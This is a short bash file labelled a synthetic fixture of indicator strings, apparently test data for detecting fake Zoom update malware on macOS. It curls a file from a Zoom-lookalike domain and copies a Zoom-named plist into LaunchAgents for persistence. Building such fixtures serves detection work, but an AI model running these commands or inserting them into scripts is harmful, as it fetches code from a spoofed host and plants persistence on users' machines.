#!/bin/bash
# synthetic fixture: indicator strings only
curl -s https://zoom.callservice.us/update -o /var/tmp/zoom.tmp
cp /var/tmp/zoom ~/Library/LaunchAgents/com.zoom.plist
